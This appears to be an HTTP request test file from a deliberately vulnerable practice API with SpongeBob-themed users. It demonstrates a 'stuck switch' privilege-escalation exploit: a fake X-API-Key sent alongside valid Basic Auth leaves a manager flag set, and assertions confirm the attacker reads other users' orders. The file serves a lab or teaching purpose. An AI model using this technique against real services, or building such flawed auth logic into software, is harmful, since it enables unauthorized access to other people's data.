# @import ../common/setup.http
@base = {{base_host}}/v204

### Step 1: SpongeBob places an order (The Target)
# @name spongebob_order
POST {{base}}/orders
Authorization: {{spongebob_auth}}
Content-Type: application/x-www-form-urlencoded

item=4

### Exploit: The "Stuck Switch"
# Plankton sends a Fake API Key (which fails validation) AND valid Basic Auth (which succeeds).
# The failed key validation leaves a "Manager Mode" flag stuck on `True`.
# The subsequent Basic Auth login inherits this flag.
# @name exploit
GET {{base}}/orders
Authorization: {{plankton_auth}}
X-API-Key: fake

# Verification: Plankton sees ALL orders (including SpongeBob's), proving he is in Manager Mode.
?? status == 200
?? js response.body.some(o => o.user_id == 2)
